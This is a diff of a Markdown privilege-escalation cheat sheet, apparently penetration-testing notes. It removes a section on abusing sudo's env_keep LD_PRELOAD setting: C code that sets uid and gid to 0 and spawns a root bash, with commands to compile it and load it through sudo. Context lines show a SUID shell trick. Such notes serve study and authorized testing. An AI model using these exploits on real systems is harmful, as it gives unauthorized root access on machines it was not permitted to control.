@@ -28,33 +28,6 @@ chmod u+s /tmp/<file>
 /tmp/<file> -p
 ```
 
-## LD\_PRELOAD
-
-If you find inside the output of `sudo -l` the sentence: env\_keep+=LD\_PRELOAD and you can call some command with sudo, you can escalate privileges.
-
-#### exploit code
-
-```c
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
-}
-```
-
-#### compile and execute
-
-```bash
-cd /tmp
-gcc -fPIC -shared -o pv.so <file>.c -nostartfiles
-sudo LD_PRELOAD=pv.so <any command you can call with sudo>
-```
-
 ## SUID exploit
 
 ### Built-in exploitable binaries
